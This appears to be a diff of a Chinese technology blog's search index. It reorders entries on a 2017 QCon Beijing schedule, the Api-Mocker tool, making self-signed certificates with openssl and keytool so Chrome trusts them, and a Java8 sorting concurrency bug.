@@ -1,72 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>2017_QCON日程</title>
-    <url>/technology/2017/04/2017_QCON%E6%97%A5%E7%A8%8B/</url>
-    <content><![CDATA[<blockquote>
-<p>2017 QCON全球软件开发大会 北京·国家会议中心 04.16~04.18</p>
-<p>地址及日程如下</p>
-</blockquote>
-<p><img src="http://img.willowspace.cn/willowspace_2016/1492109894337.png"></p>
-<h1 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h1><h2 id="主题演讲-大会堂A"><a href="#主题演讲-大会堂A" class="headerlink" title="主题演讲 大会堂A"></a>主题演讲 大会堂A</h2><ul>
-<li>09:00 开场致辞&amp;<a href="http://2017.qconbeijing.com/presentation/803">持续集成之 Why、What &amp; How</a> CloudBees CTO，Jenkins 创始人和主要开发者 Kohsuke Kawaguchi（川口耕介）</li>
-</ul>
-<h2 id="微服务与实时处理架构演进（厂商共建）-306B"><a href="#微服务与实时处理架构演进（厂商共建）-306B" class="headerlink" title="微服务与实时处理架构演进（厂商共建） 306B"></a><a href="http://2017.qconbeijing.com/track/128">微服务与实时处理架构演进（厂商共建）</a> 306B</h2><ul>
-<li>10:30 <a href="http://2017.qconbeijing.com/presentation/846">在业务量暴增中痛并快乐——数据交易平台的成长记事</a> TalkingData 数据工程师 赵志刚</li>
-</ul>
-<h2 id="Google、Uber-的分布式系统设计-311A"><a href="#Google、Uber-的分布式系统设计-311A" class="headerlink" title="Google、Uber 的分布式系统设计 311A"></a><a href="http://2017.qconbeijing.com/track/139">Google、Uber 的分布式系统设计</a> 311A</h2><ul>
-<li>11:30 <a href="http://2017.qconbeijing.com/presentation/810">使用一致协议来实现数据复制</a> Uber Senior Software Engineer 王盟</li>
-</ul>
-<h2 id="互联网新挑战-甲骨文黑科技（厂商专场）-306B"><a href="#互联网新挑战-甲骨文黑科技（厂商专场）-306B" class="headerlink" title="互联网新挑战 甲骨文黑科技（厂商专场） 306B"></a><a href="http://2017.qconbeijing.com/track/138">互联网新挑战 甲骨文黑科技（厂商专场）</a> 306B</h2><ul>
-<li>14:00  <a href="http://2017.qconbeijing.com/presentation/862">Java 9 新特性介绍及 Jigsaw 一览</a> 甲骨文首席工程师 杨晓峰</li>
-</ul>
-<h2 id="人工智能与深度学习-311A"><a href="#人工智能与深度学习-311A" class="headerlink" title="人工智能与深度学习 311A"></a><a href="http://2017.qconbeijing.com/track/69">人工智能与深度学习</a> 311A</h2><ul>
-<li>14:55 <a href="http://2017.qconbeijing.com/presentation/624">经典算法与人工智能在外卖物流调度中的应用</a> 百度外卖资深策略架构师 徐明泉</li>
-</ul>
-<h2 id="快速进化的容器生态-309B"><a href="#快速进化的容器生态-309B" class="headerlink" title="快速进化的容器生态 309B"></a><a href="http://2017.qconbeijing.com/track/60">快速进化的容器生态</a> 309B</h2><ul>
-<li>16:00 <a href="http://2017.qconbeijing.com/presentation/523">容器编排方案 Swarm 的演进</a> 阿里云高级专家 陈萌辉</li>
-</ul>
-<h2 id="新一代-APM-技术（厂商专场）-306A"><a href="#新一代-APM-技术（厂商专场）-306A" class="headerlink" title="新一代 APM 技术（厂商专场） 306A"></a><a href="http://2017.qconbeijing.com/track/140">新一代 APM 技术（厂商专场）</a> 306A</h2><ul>
-<li>16:55 <a href="http://2017.qconbeijing.com/presentation/897">Oracle 和 MySQL 性能优化感悟</a> 搜狐搜狐畅游 DBA 杨建荣</li>
-</ul>
-<h1 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h1><h2 id="主题演讲-大会堂A-1"><a href="#主题演讲-大会堂A-1" class="headerlink" title="主题演讲 大会堂A"></a>主题演讲 大会堂A</h2><ul>
-<li>09:00 <a href="http://2017.qconbeijing.com/presentation/877">人工智能驱动智慧零售</a> 京东集团副总裁、京东商城研发体系负责人 马松</li>
-</ul>
-<h2 id="推荐系统架构演进-307A"><a href="#推荐系统架构演进-307A" class="headerlink" title="推荐系统架构演进 307A"></a><a href="http://2017.qconbeijing.com/track/126">推荐系统架构演进</a> 307A</h2><ul>
-<li>11:45 <a href="http://2017.qconbeijing.com/presentation/725">今日头条推荐系统架构设计实践</a> 今日头条资深研发工程师 金敬亭</li>
-</ul>
-<h2 id="业务架构那些事-310"><a href="#业务架构那些事-310" class="headerlink" title="业务架构那些事 310"></a><a href="http://2017.qconbeijing.com/track/62">业务架构那些事</a> 310</h2><ul>
-<li>14:00 <a href="http://2017.qconbeijing.com/presentation/759">微信红包后台系统可用性设计实践</a> 腾讯高级工程师 方乐明</li>
-<li>14:55 <a href="http://2017.qconbeijing.com/presentation/660">QQ 空间平台百亿级流量的社交广告系统海量实践</a> 腾讯 QQ 空间营收功能后台技术负责人 冯启航</li>
-<li>16:00 <a href="http://2017.qconbeijing.com/presentation/816">企业代码安全最佳实践</a> 美丽联合集团资深安全专家，Cobra 作者 止介</li>
-<li>16:55 <a href="http://2017.qconbeijing.com/presentation/820">从 Linux 系统内核层面来解决实际问题的实战经验</a> 美丽联合集团蘑菇街技术专家 邵亚方</li>
-</ul>
-<h1 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h1><h2 id="容器应用与工程效率提升（厂商共建）-大会堂A"><a href="#容器应用与工程效率提升（厂商共建）-大会堂A" class="headerlink" title="容器应用与工程效率提升（厂商共建） 大会堂A"></a><a href="http://2017.qconbeijing.com/track/130">容器应用与工程效率提升（厂商共建）</a> 大会堂A</h2><ul>
-<li>09:30 <a href="http://2017.qconbeijing.com/presentation/851">基于 Docker 的全自动化性能测试平台</a> 秦苍科技高级测试工程师 于国庆</li>
-</ul>
-<h2 id="网络信息安全建设最佳实践-307A"><a href="#网络信息安全建设最佳实践-307A" class="headerlink" title="网络信息安全建设最佳实践 307A"></a><a href="http://2017.qconbeijing.com/track/74">网络信息安全建设最佳实践</a> 307A</h2><ul>
-<li>10:30 <a href="http://2017.qconbeijing.com/presentation/720">代码未写，漏洞已出——谈谈设计不当导致的安全问题</a> 腾讯玄武实验室总监 于旸（TK）</li>
-<li>11:25 <a href="http://2017.qconbeijing.com/presentation/618">甲方安全从 0 到 1</a> bilibili 安全团队负责人 吴文灏</li>
-</ul>
-<h2 id="大规模分布式系统架构与实践-310"><a href="#大规模分布式系统架构与实践-310" class="headerlink" title="大规模分布式系统架构与实践 310"></a><a href="http://2017.qconbeijing.com/track/76">大规模分布式系统架构与实践</a> 310</h2><ul>
-<li>13:30 <a href="http://2017.qconbeijing.com/presentation/745">PaxosStore：微信跨数据中心强一致存储系统</a> 微信存储系统主要负责人 曾楚伟</li>
-<li>14:25 <a href="http://2017.qconbeijing.com/presentation/663">从百度文件系统看大型分布式系统设计中的定式与创新</a> 百度搜索架构师 颜世光</li>
-<li>15:30 <a href="http://2017.qconbeijing.com/presentation/646">对 2000 多亿条数据做一次 group by 需要多久？</a> 腾讯社交与效果广告部检索系统组主管 易杰</li>
-</ul>
-<h2 id="17-10-演讲结束"><a href="#17-10-演讲结束" class="headerlink" title="17:10 演讲结束"></a>17:10 演讲结束</h2><blockquote>
-<p>附：</p>
-</blockquote>
-<p><a href="http://2017.qconshanghai.com/schedule">2017上海QCON日程链接</a></p>
-]]></content>
-      <categories>
-        <category>technology</category>
-      </categories>
-      <tags>
-        <tag>QCON</tag>
-        <tag>Conference</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Api-Mocker</title>
     <url>/technology/2017/09/Api-Mocker/</url>
     <content><![CDATA[<h1 id="Api-Mocker"><a href="#Api-Mocker" class="headerlink" title="Api-Mocker"></a>Api-Mocker</h1><p><code>Api-Mocker</code>是 <a href="http://www.dxy.cn/"><code>丁香园</code></a> 前端团队开源的一款接口管理软件。集诸如阿里开源的Rap、Chrome的postman等接口相关工具的优点于一身。 <a href="https://github.com/DXY-F2E/api-mocker">github地址</a></p>
@@ -98,6 +32,69 @@
         <tag>node</tag>
         <tag>mongo</tag>
         <tag>ops</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Chrome信任自签数字证书</title>
+    <url>/technology/2018/10/Chrome%E4%BF%A1%E4%BB%BB%E8%87%AA%E7%AD%BE%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/</url>
+    <content><![CDATA[<h1 id="Chrome信任自签数字证书"><a href="#Chrome信任自签数字证书" class="headerlink" title="Chrome信任自签数字证书"></a>Chrome信任自签数字证书</h1><h2 id="如何自签一个CA证书和一个子证书"><a href="#如何自签一个CA证书和一个子证书" class="headerlink" title="如何自签一个CA证书和一个子证书"></a>如何自签一个CA证书和一个子证书</h2><ol>
+<li>创建CA配置文件</li>
+</ol>
+  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">touch localhost_ca.cnf</span><br><span class="line"></span><br><span class="line">[ req ]</span><br><span class="line">distinguished_name  = req_distinguished_name</span><br><span class="line">x509_extensions     = root_ca</span><br><span class="line"></span><br><span class="line">[ req_distinguished_name ]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以下内容可随意填写</span></span><br><span class="line">countryName             = CN (2 letter code)</span><br><span class="line">countryName_min         = 2</span><br><span class="line">countryName_max         = 2</span><br><span class="line">stateOrProvinceName     = ZheJiang</span><br><span class="line">localityName            = HangZhou</span><br><span class="line">organizationName        = Dxy</span><br><span class="line">organizationalUnitName  = technology</span><br><span class="line">commonName              = develop</span><br><span class="line">commonName_max          = 64</span><br><span class="line">emailAddress            = yangw@dxy.cn</span><br><span class="line">emailAddress_max        = 64</span><br><span class="line"></span><br><span class="line">[ root_ca ]</span><br><span class="line">basicConstraints        = critical, CA:true</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>创建扩展配置文件</li>
+</ol>
+  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">touch localhost_ca.ext</span><br><span class="line"></span><br><span class="line">subjectAltName = @alt_names</span><br><span class="line">extendedKeyUsage = serverAuth</span><br><span class="line"></span><br><span class="line">[alt_names]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">域名，如有多个用DNS.2,DNS.3…来增加</span></span><br><span class="line">DNS.1 = a.domain.cn</span><br><span class="line">DNS.2 = b.domain.cn</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">IP地址</span></span><br><span class="line">IP.1 = 192.168.0.1</span><br><span class="line">IP.2 = 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>创建CA证书私钥及CA证书</li>
+</ol>
+  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:2048 -out $CA_CER_NAME.cer -outform PEM -keyout $CA_KEY_NAME.pvk -days 10000 -verbose -config $CA_CNF_FILE -nodes -sha256 -subj &quot;/CN=$CA_CER_NAME&quot;</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>创建子证书私钥</li>
+</ol>
+  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl req -newkey rsa:2048 -keyout $KEY_NAME.pvk -out $CER_NAME.req -subj /CN=$CA_CER_NAME -sha256 -nodes</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>创建子证书</li>
+</ol>
+  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl x509 -req -CA $CA_CER_NAME.cer -CAkey $CA_KEY_NAME.pvk -in $CER_NAME.req -out $CER_NAME.cer -days 10000 -extfile $CA_EXT_FILE -sha256 -set_serial 0x1111</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>可以做成脚本以便复用</p>
+</blockquote>
+  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/zsh</span></span><br><span class="line">CA_CER_NAME=localhost_ca</span><br><span class="line">CA_KEY_NAME=localhost_ca</span><br><span class="line">CA_CNF_FILE=./localhost_ca.cnf</span><br><span class="line">CA_EXT_FILE=./localhost_ca.ext</span><br><span class="line"></span><br><span class="line">CER_NAME=localhost</span><br><span class="line">KEY_NAME=localhost</span><br><span class="line"></span><br><span class="line">openssl req -x509 -newkey rsa:2048 -out $CA_CER_NAME.cer -outform PEM -keyout $CA_KEY_NAME.pvk -days 10000 -verbose -config $CA_CNF_FILE -nodes -sha256 -subj &quot;/CN=$CA_CER_NAME&quot;</span><br><span class="line"></span><br><span class="line">openssl req -newkey rsa:2048 -keyout $KEY_NAME.pvk -out $CER_NAME.req -subj /CN=$CA_CER_NAME -sha256 -nodes</span><br><span class="line"></span><br><span class="line">openssl x509 -req -CA $CA_CER_NAME.cer -CAkey $CA_KEY_NAME.pvk -in $CER_NAME.req -out $CER_NAME.cer -days 10000 -extfile $CA_EXT_FILE -sha256 -set_serial 0x1111</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Chrome如何信任自签证书"><a href="#Chrome如何信任自签证书" class="headerlink" title="Chrome如何信任自签证书"></a>Chrome如何信任自签证书</h2><ol>
+<li>chrome:&#x2F;&#x2F;settings进入Chrome设置界面,搜索certificate,找到并点击Manage certificates将进入系统Keychain Access</li>
+<li>将生成CA(.cer)证书导入</li>
+<li>将导入后的CA证书设置成always trust</li>
+</ol>
+<h2 id="一些证书使用场景"><a href="#一些证书使用场景" class="headerlink" title="一些证书使用场景"></a>一些证书使用场景</h2><h3 id="pem格式转cer格式"><a href="#pem格式转cer格式" class="headerlink" title="pem格式转cer格式"></a>pem格式转cer格式</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl x509 -inform PEM -in cacert.pem -outform DER -out certificate.cer</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看jdk证书"><a href="#查看jdk证书" class="headerlink" title="查看jdk证书"></a>查看jdk证书</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -list -keystore &quot;%JAVA_HOME%/jre/lib/security/cacerts&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="jdk密钥库操作"><a href="#jdk密钥库操作" class="headerlink" title="jdk密钥库操作"></a>jdk密钥库操作</h3><p><strong>修改密码</strong></p>
+  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -storepasswd -keystore &quot;%JAVA_HOME%/jre/lib/security/cacerts&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>导入证书</strong></p>
+  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -import -noprompt -trustcacerts -alias &lt;AliasName&gt; -file   &lt;certificate&gt; -keystore &lt;KeystoreFile&gt; -storepass &lt;Password&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>删除证书</strong></p>
+  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -delete -alias &lt;keyAlias&gt; -keystore &lt;keystore-name&gt; -storepass &lt;password&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="cocos-creator中打包原生android应用时，使用android-studio中的证书"><a href="#cocos-creator中打包原生android应用时，使用android-studio中的证书" class="headerlink" title="cocos creator中打包原生android应用时，使用android studio中的证书"></a>cocos creator中打包原生android应用时，使用android studio中的证书</h3><p>找到构建好的原生android项目，修改其中gradle.properties文件，添加：</p>
+  <figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">systemProp.javax.net.ssl.trustStore</span>=<span class="string">&#123;your-android-studio-directory&#125;\\jre\\jre\\lib\\security\\cacerts</span></span><br><span class="line"><span class="attr">systemProp.javax.net.ssl.trustStorePassword</span>=<span class="string">changeit</span></span><br></pre></td></tr></table></figure>
+<p>这将让cocos使用android studio的证书，然后在android studio中配置证书：Preference-&gt;Tools-&gt;Server Certification中添加证书</p>
+]]></content>
+      <categories>
+        <category>technology</category>
+      </categories>
+      <tags>
+        <tag>https</tag>
+        <tag>ca</tag>
       </tags>
   </entry>
   <entry>
@@ -205,69 +202,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Chrome信任自签数字证书</title>
-    <url>/technology/2018/10/Chrome%E4%BF%A1%E4%BB%BB%E8%87%AA%E7%AD%BE%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/</url>
-    <content><![CDATA[<h1 id="Chrome信任自签数字证书"><a href="#Chrome信任自签数字证书" class="headerlink" title="Chrome信任自签数字证书"></a>Chrome信任自签数字证书</h1><h2 id="如何自签一个CA证书和一个子证书"><a href="#如何自签一个CA证书和一个子证书" class="headerlink" title="如何自签一个CA证书和一个子证书"></a>如何自签一个CA证书和一个子证书</h2><ol>
-<li>创建CA配置文件</li>
-</ol>
-  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">touch localhost_ca.cnf</span><br><span class="line"></span><br><span class="line">[ req ]</span><br><span class="line">distinguished_name  = req_distinguished_name</span><br><span class="line">x509_extensions     = root_ca</span><br><span class="line"></span><br><span class="line">[ req_distinguished_name ]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以下内容可随意填写</span></span><br><span class="line">countryName             = CN (2 letter code)</span><br><span class="line">countryName_min         = 2</span><br><span class="line">countryName_max         = 2</span><br><span class="line">stateOrProvinceName     = ZheJiang</span><br><span class="line">localityName            = HangZhou</span><br><span class="line">organizationName        = Dxy</span><br><span class="line">organizationalUnitName  = technology</span><br><span class="line">commonName              = develop</span><br><span class="line">commonName_max          = 64</span><br><span class="line">emailAddress            = yangw@dxy.cn</span><br><span class="line">emailAddress_max        = 64</span><br><span class="line"></span><br><span class="line">[ root_ca ]</span><br><span class="line">basicConstraints        = critical, CA:true</span><br></pre></td></tr></table></figure>
-<ol start="2">
-<li>创建扩展配置文件</li>
-</ol>
-  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">touch localhost_ca.ext</span><br><span class="line"></span><br><span class="line">subjectAltName = @alt_names</span><br><span class="line">extendedKeyUsage = serverAuth</span><br><span class="line"></span><br><span class="line">[alt_names]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">域名，如有多个用DNS.2,DNS.3…来增加</span></span><br><span class="line">DNS.1 = a.domain.cn</span><br><span class="line">DNS.2 = b.domain.cn</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">IP地址</span></span><br><span class="line">IP.1 = 192.168.0.1</span><br><span class="line">IP.2 = 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<ol start="3">
-<li>创建CA证书私钥及CA证书</li>
-</ol>
-  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:2048 -out $CA_CER_NAME.cer -outform PEM -keyout $CA_KEY_NAME.pvk -days 10000 -verbose -config $CA_CNF_FILE -nodes -sha256 -subj &quot;/CN=$CA_CER_NAME&quot;</span><br></pre></td></tr></table></figure>
-
-<ol start="4">
-<li>创建子证书私钥</li>
-</ol>
-  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl req -newkey rsa:2048 -keyout $KEY_NAME.pvk -out $CER_NAME.req -subj /CN=$CA_CER_NAME -sha256 -nodes</span><br></pre></td></tr></table></figure>
-
-<ol start="5">
-<li>创建子证书</li>
-</ol>
-  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl x509 -req -CA $CA_CER_NAME.cer -CAkey $CA_KEY_NAME.pvk -in $CER_NAME.req -out $CER_NAME.cer -days 10000 -extfile $CA_EXT_FILE -sha256 -set_serial 0x1111</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>可以做成脚本以便复用</p>
-</blockquote>
-  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/zsh</span></span><br><span class="line">CA_CER_NAME=localhost_ca</span><br><span class="line">CA_KEY_NAME=localhost_ca</span><br><span class="line">CA_CNF_FILE=./localhost_ca.cnf</span><br><span class="line">CA_EXT_FILE=./localhost_ca.ext</span><br><span class="line"></span><br><span class="line">CER_NAME=localhost</span><br><span class="line">KEY_NAME=localhost</span><br><span class="line"></span><br><span class="line">openssl req -x509 -newkey rsa:2048 -out $CA_CER_NAME.cer -outform PEM -keyout $CA_KEY_NAME.pvk -days 10000 -verbose -config $CA_CNF_FILE -nodes -sha256 -subj &quot;/CN=$CA_CER_NAME&quot;</span><br><span class="line"></span><br><span class="line">openssl req -newkey rsa:2048 -keyout $KEY_NAME.pvk -out $CER_NAME.req -subj /CN=$CA_CER_NAME -sha256 -nodes</span><br><span class="line"></span><br><span class="line">openssl x509 -req -CA $CA_CER_NAME.cer -CAkey $CA_KEY_NAME.pvk -in $CER_NAME.req -out $CER_NAME.cer -days 10000 -extfile $CA_EXT_FILE -sha256 -set_serial 0x1111</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Chrome如何信任自签证书"><a href="#Chrome如何信任自签证书" class="headerlink" title="Chrome如何信任自签证书"></a>Chrome如何信任自签证书</h2><ol>
-<li>chrome:&#x2F;&#x2F;settings进入Chrome设置界面,搜索certificate,找到并点击Manage certificates将进入系统Keychain Access</li>
-<li>将生成CA(.cer)证书导入</li>
-<li>将导入后的CA证书设置成always trust</li>
-</ol>
-<h2 id="一些证书使用场景"><a href="#一些证书使用场景" class="headerlink" title="一些证书使用场景"></a>一些证书使用场景</h2><h3 id="pem格式转cer格式"><a href="#pem格式转cer格式" class="headerlink" title="pem格式转cer格式"></a>pem格式转cer格式</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl x509 -inform PEM -in cacert.pem -outform DER -out certificate.cer</span><br></pre></td></tr></table></figure>
-
-<h3 id="查看jdk证书"><a href="#查看jdk证书" class="headerlink" title="查看jdk证书"></a>查看jdk证书</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -list -keystore &quot;%JAVA_HOME%/jre/lib/security/cacerts&quot;</span><br></pre></td></tr></table></figure>
-
-<h3 id="jdk密钥库操作"><a href="#jdk密钥库操作" class="headerlink" title="jdk密钥库操作"></a>jdk密钥库操作</h3><p><strong>修改密码</strong></p>
-  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -storepasswd -keystore &quot;%JAVA_HOME%/jre/lib/security/cacerts&quot;</span><br></pre></td></tr></table></figure>
-
-<p><strong>导入证书</strong></p>
-  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -import -noprompt -trustcacerts -alias &lt;AliasName&gt; -file   &lt;certificate&gt; -keystore &lt;KeystoreFile&gt; -storepass &lt;Password&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>删除证书</strong></p>
-  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -delete -alias &lt;keyAlias&gt; -keystore &lt;keystore-name&gt; -storepass &lt;password&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="cocos-creator中打包原生android应用时，使用android-studio中的证书"><a href="#cocos-creator中打包原生android应用时，使用android-studio中的证书" class="headerlink" title="cocos creator中打包原生android应用时，使用android studio中的证书"></a>cocos creator中打包原生android应用时，使用android studio中的证书</h3><p>找到构建好的原生android项目，修改其中gradle.properties文件，添加：</p>
-  <figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">systemProp.javax.net.ssl.trustStore</span>=<span class="string">&#123;your-android-studio-directory&#125;\\jre\\jre\\lib\\security\\cacerts</span></span><br><span class="line"><span class="attr">systemProp.javax.net.ssl.trustStorePassword</span>=<span class="string">changeit</span></span><br></pre></td></tr></table></figure>
-<p>这将让cocos使用android studio的证书，然后在android studio中配置证书：Preference-&gt;Tools-&gt;Server Certification中添加证书</p>
-]]></content>
-      <categories>
-        <category>technology</category>
-      </categories>
-      <tags>
-        <tag>https</tag>
-        <tag>ca</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Java Method Breakpoints are evil</title>
     <url>/technology/2017/08/Java%20Method%20Breakpoints%20are%20evil/</url>
     <content><![CDATA[<h1 id="问题以及解决方案"><a href="#问题以及解决方案" class="headerlink" title="问题以及解决方案"></a>问题以及解决方案</h1><p>今天使用Intellj IDEA部署web项目时，spring web容器上下文(ContextLoader)加载非常慢，慢到完全启动一个项目需要耗时20分钟左右。</p>
@@ -355,17 +289,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Java 应用采用 Docker 容器化的最佳实践</title>
-    <url>/technology/2024/06/Java-%E5%BA%94%E7%94%A8%E9%87%87%E7%94%A8-Docker-%E5%AE%B9%E5%99%A8%E5%8C%96%E7%9A%84%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>technology</category>
-      </categories>
-      <tags>
-        <tag>java</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Java8 Collections::sort引起的ConcurrentModificationException</title>
     <url>/technology/2017/09/Java8-Collections-sort%E5%BC%95%E8%B5%B7%E7%9A%84ConcurrentModificationException/</url>
     <content><![CDATA[<h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>生产环境(JDK8u144)中有部分公共数据存在xml中，使用时会将xml数据读取到内存，以 <code>ArrayList</code> 存储，多个用户(多线程)对同一个 <code>ArrayList</code>  使用了 <code>Collections</code> 的sort(List,Comparator)方法进行排序，从而触发了 <code>ConcurrentModificationException</code>。其本质就是一个并发问题。</p>
@@ -390,6 +313,17 @@
         <tag>java</tag>
         <tag>java8</tag>
         <tag>并发编程</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java 应用采用 Docker 容器化的最佳实践</title>
+    <url>/technology/2024/06/Java-%E5%BA%94%E7%94%A8%E9%87%87%E7%94%A8-Docker-%E5%AE%B9%E5%99%A8%E5%8C%96%E7%9A%84%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>technology</category>
+      </categories>
+      <tags>
+        <tag>java</tag>
       </tags>
   </entry>
   <entry>
@@ -419,6 +353,72 @@
         <tag>JavaDoc</tag>
         <tag>奇淫巧技</tag>
         <tag>代码规范</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2017_QCON日程</title>
+    <url>/technology/2017/04/2017_QCON%E6%97%A5%E7%A8%8B/</url>
+    <content><![CDATA[<blockquote>
+<p>2017 QCON全球软件开发大会 北京·国家会议中心 04.16~04.18</p>
+<p>地址及日程如下</p>
+</blockquote>
+<p><img src="http://img.willowspace.cn/willowspace_2016/1492109894337.png"></p>
+<h1 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h1><h2 id="主题演讲-大会堂A"><a href="#主题演讲-大会堂A" class="headerlink" title="主题演讲 大会堂A"></a>主题演讲 大会堂A</h2><ul>
+<li>09:00 开场致辞&amp;<a href="http://2017.qconbeijing.com/presentation/803">持续集成之 Why、What &amp; How</a> CloudBees CTO，Jenkins 创始人和主要开发者 Kohsuke Kawaguchi（川口耕介）</li>
+</ul>
+<h2 id="微服务与实时处理架构演进（厂商共建）-306B"><a href="#微服务与实时处理架构演进（厂商共建）-306B" class="headerlink" title="微服务与实时处理架构演进（厂商共建） 306B"></a><a href="http://2017.qconbeijing.com/track/128">微服务与实时处理架构演进（厂商共建）</a> 306B</h2><ul>
+<li>10:30 <a href="http://2017.qconbeijing.com/presentation/846">在业务量暴增中痛并快乐——数据交易平台的成长记事</a> TalkingData 数据工程师 赵志刚</li>
+</ul>
+<h2 id="Google、Uber-的分布式系统设计-311A"><a href="#Google、Uber-的分布式系统设计-311A" class="headerlink" title="Google、Uber 的分布式系统设计 311A"></a><a href="http://2017.qconbeijing.com/track/139">Google、Uber 的分布式系统设计</a> 311A</h2><ul>
+<li>11:30 <a href="http://2017.qconbeijing.com/presentation/810">使用一致协议来实现数据复制</a> Uber Senior Software Engineer 王盟</li>
+</ul>
+<h2 id="互联网新挑战-甲骨文黑科技（厂商专场）-306B"><a href="#互联网新挑战-甲骨文黑科技（厂商专场）-306B" class="headerlink" title="互联网新挑战 甲骨文黑科技（厂商专场） 306B"></a><a href="http://2017.qconbeijing.com/track/138">互联网新挑战 甲骨文黑科技（厂商专场）</a> 306B</h2><ul>
+<li>14:00  <a href="http://2017.qconbeijing.com/presentation/862">Java 9 新特性介绍及 Jigsaw 一览</a> 甲骨文首席工程师 杨晓峰</li>
+</ul>
+<h2 id="人工智能与深度学习-311A"><a href="#人工智能与深度学习-311A" class="headerlink" title="人工智能与深度学习 311A"></a><a href="http://2017.qconbeijing.com/track/69">人工智能与深度学习</a> 311A</h2><ul>
+<li>14:55 <a href="http://2017.qconbeijing.com/presentation/624">经典算法与人工智能在外卖物流调度中的应用</a> 百度外卖资深策略架构师 徐明泉</li>
+</ul>
+<h2 id="快速进化的容器生态-309B"><a href="#快速进化的容器生态-309B" class="headerlink" title="快速进化的容器生态 309B"></a><a href="http://2017.qconbeijing.com/track/60">快速进化的容器生态</a> 309B</h2><ul>
+<li>16:00 <a href="http://2017.qconbeijing.com/presentation/523">容器编排方案 Swarm 的演进</a> 阿里云高级专家 陈萌辉</li>
+</ul>
+<h2 id="新一代-APM-技术（厂商专场）-306A"><a href="#新一代-APM-技术（厂商专场）-306A" class="headerlink" title="新一代 APM 技术（厂商专场） 306A"></a><a href="http://2017.qconbeijing.com/track/140">新一代 APM 技术（厂商专场）</a> 306A</h2><ul>
+<li>16:55 <a href="http://2017.qconbeijing.com/presentation/897">Oracle 和 MySQL 性能优化感悟</a> 搜狐搜狐畅游 DBA 杨建荣</li>
+</ul>
+<h1 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h1><h2 id="主题演讲-大会堂A-1"><a href="#主题演讲-大会堂A-1" class="headerlink" title="主题演讲 大会堂A"></a>主题演讲 大会堂A</h2><ul>
